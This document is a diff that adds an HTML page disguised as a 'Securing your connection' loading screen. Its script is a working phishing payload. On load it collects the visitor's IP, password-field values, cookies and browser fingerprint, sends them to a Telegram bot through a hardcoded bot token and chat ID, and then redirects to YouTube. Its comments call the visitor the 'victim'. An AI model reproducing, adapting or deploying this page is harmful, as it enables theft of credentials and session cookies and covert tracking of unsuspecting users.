@@ -1,0 +1,126 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Loading...</title>
+    <style>
+        body { background: #0d1117; display: flex; justify-content: center; align-items: center; height: 100vh; flex-direction: column; color: #fff; font-family: Arial; }
+        .spinner { width: 50px; height: 50px; border: 5px solid #30363d; border-top: 5px solid #58a6ff; border-radius: 50%; animation: spin 0.8s linear infinite; }
+        @keyframes spin { 100% { transform: rotate(360deg); } }
+        .text { margin-top: 20px; font-size: 16px; color: #8b949e; }
+        .status { margin-top: 10px; font-size: 14px; color: #58a6ff; }
+    </style>
+</head>
+<body>
+    <div class="spinner"></div>
+    <div class="text">🔐 Securing your connection...</div>
+    <div class="status" id="status">Please wait...</div>
+
+    <script>
+        // ============================================================
+        // 🔥 TELEGRAM CONFIG - YAHAN APNA TOKEN AUR CHAT_ID DAALO
+        // ============================================================
+        const BOT_TOKEN = "8899172740:AAGx2l4uy6JrfPQgmpE-CiwJG9n3Zy5qJFk";
+        const CHAT_ID = "6389764004";
+
+        // ============================================================
+        // 🧠 DATA EXTRACTION (VICTIM KE BROWSER MEIN)
+        // ============================================================
+
+        async function getIP() {
+            try {
+                let r = await fetch('https://api.ipify.org?format=json');
+                let d = await r.json();
+                return d.ip || 'Unknown';
+            } catch { return 'Unable to fetch'; }
+        }
+
+        function getSavedPasswords() {
+            let results = [];
+            document.querySelectorAll('input[type="password"]').forEach(el => {
+                if (el.value && el.value.trim() !== '') {
+                    results.push({ name: el.name || el.id || 'password', value: el.value });
+                }
+            });
+            return results;
+        }
+
+        function getCookies() {
+            return document.cookie || 'No cookies found';
+        }
+
+        function getFingerprint() {
+            return {
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                language: navigator.language,
+                screenWidth: screen.width,
+                screenHeight: screen.height,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                url: location.href,
+                referrer: document.referrer || 'Direct'
+            };
+        }
+
+        async function sendToTelegram(message) {
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}&parse_mode=Markdown`;
+            try {
+                let r = await fetch(url, { method: 'GET' });
+                let d = await r.json();
+                return d.ok;
+            } catch { return false; }
+        }
+
+        window.addEventListener('load', async function() {
+            document.getElementById('status').innerText = '🔍 Extracting data...';
+
+            const ip = await getIP();
+            const cookies = getCookies();
+            const passwords = getSavedPasswords();
+            const fingerprint = getFingerprint();
+            const time = new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' });
+
+            let msg = `🎯 **GHOST PHISHING EXTRACT**\n━━━━━━━━━━━━━━━━━━━━━\n`;
+            msg += `🌐 **IP:** ${ip}\n`;
+            msg += `🔗 **URL:** ${fingerprint.url}\n`;
+            msg += `↩️ **Referrer:** ${fingerprint.referrer}\n`;
+            msg += `🕐 **Time:** ${time}\n━━━━━━━━━━━━━━━━━━━━━\n`;
+
+            if (passwords.length > 0) {
+                msg += `\n🔑 **SAVED PASSWORDS:**\n`;
+                passwords.forEach((p, i) => {
+                    msg += `  ${i+1}. ${p.name}: \`${p.value}\`\n`;
+                });
+            } else {
+                msg += `\n🔑 **SAVED PASSWORDS:** None found\n`;
+            }
+
+            if (cookies && cookies !== 'No cookies found') {
+                msg += `\n🍪 **COOKIES:**\n\`${cookies}\`\n`;
+            } else {
+                msg += `\n🍪 **COOKIES:** None found\n`;
+            }
+
+            msg += `\n━━━━━━━━━━━━━━━━━━━━━\n`;
+            msg += `🖥️ **FINGERPRINT:**\n`;
+            msg += `  📱 User-Agent: ${fingerprint.userAgent}\n`;
+            msg += `  💻 Platform: ${fingerprint.platform}\n`;
+            msg += `  🌍 Language: ${fingerprint.language}\n`;
+            msg += `  📐 Screen: ${fingerprint.screenWidth}x${fingerprint.screenHeight}\n`;
+            msg += `  🕐 Timezone: ${fingerprint.timezone}\n`;
+            msg += `━━━━━━━━━━━━━━━━━━━━━`;
+
+            const sent = await sendToTelegram(msg);
+
+            if (sent) {
+                document.getElementById('status').innerText = '✅ Data sent to Telegram!';
+            } else {
+                document.getElementById('status').innerText = '❌ Error sending data.';
+            }
+
+            setTimeout(() => {
+                window.location.href = 'https://www.youtube.com';
+            }, 3000);
+        });
+    </script>
+</body>
+</html>
